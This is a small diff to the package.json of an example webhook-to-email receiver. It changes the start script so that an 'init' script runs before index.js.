@@ -5,7 +5,7 @@
   "description": "Example webhook receiver that forwards notifications by email over SMTP",
   "main": "index.js",
   "scripts": {
-    "start": "node index.js",
+    "start": "node init && node index.js",
     "test": "node --test test/"
   },
   "engines": {
